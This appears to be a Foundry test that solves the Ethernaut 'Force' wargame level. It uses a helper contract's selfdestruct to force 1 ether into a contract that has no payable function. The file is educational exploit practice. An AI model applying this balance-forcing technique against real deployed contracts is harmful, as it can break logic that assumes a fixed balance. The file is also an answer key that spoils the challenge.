// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Force.sol";

contract MiddleMan {
    function selfDestruct(address payable target) public payable {
        selfdestruct(target);
    }
}

// use selfdestruct() to force send ether to an address
contract ForceTest is Test {
    Force instance;
    MiddleMan middleMan;
    address alice = makeAddr("alice");

    function setUp() public {
        instance = new Force();
        middleMan = new MiddleMan();

        vm.deal(alice, 1 ether);
    }

    function test() public {
        assertEq(address(instance).balance, 0);

        vm.startPrank(alice);
        middleMan.selfDestruct{value: 1 ether}(payable(address(instance)));

        assertEq(address(instance).balance, 1 ether);
    }
}
